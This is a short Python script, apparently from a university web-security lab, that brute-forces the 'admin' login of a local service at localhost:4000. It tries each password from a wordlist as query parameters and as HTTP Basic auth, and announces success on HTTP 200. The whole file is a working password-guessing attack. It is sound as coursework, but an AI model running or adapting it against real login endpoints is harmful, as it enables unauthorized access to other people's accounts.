import requests
from requests.auth import HTTPBasicAuth

path = 'C:\Studia\Bezpieczeństwo sieci web\lab01\passwords.txt'

password_file = open(path, 'r').readlines()
url = "http://localhost:4000/users"

for line in password_file:
  password = line.strip()
  res = requests.get(url + '?login=admin&pass=' + password, auth=HTTPBasicAuth('admin', password))
  print(f"Trying with pass: {password}, result: {res.status_code}")
  if res.status_code == 200:
    print("I'm in! 😈")
    break
